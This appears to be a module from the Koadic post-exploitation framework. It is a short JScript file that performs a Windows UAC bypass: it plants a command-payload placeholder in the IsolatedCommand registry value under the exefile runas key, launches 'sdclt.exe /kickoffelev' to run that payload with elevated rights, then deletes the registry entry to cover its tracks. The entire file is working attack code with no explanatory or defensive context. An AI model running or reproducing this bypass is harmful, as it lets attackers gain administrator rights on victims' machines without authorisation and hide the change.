try
{
    var path = "Software\\Classes\\exefile\\shell\\runas\\command";

    var cmd = Koadic.file.getPath("%COMSPEC%");
    Koadic.registry.write(Koadic.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~PAYLOAD_DATA~", Koadic.registry.STRING);

    Koadic.shell.run("sdclt.exe /kickoffelev", true);

    Koadic.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "IsolatedCommand") != 0)
    {
      Koadic.shell.run("reg delete HKCU\\"+path+" /v IsolatedCommand /f", true);
    }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
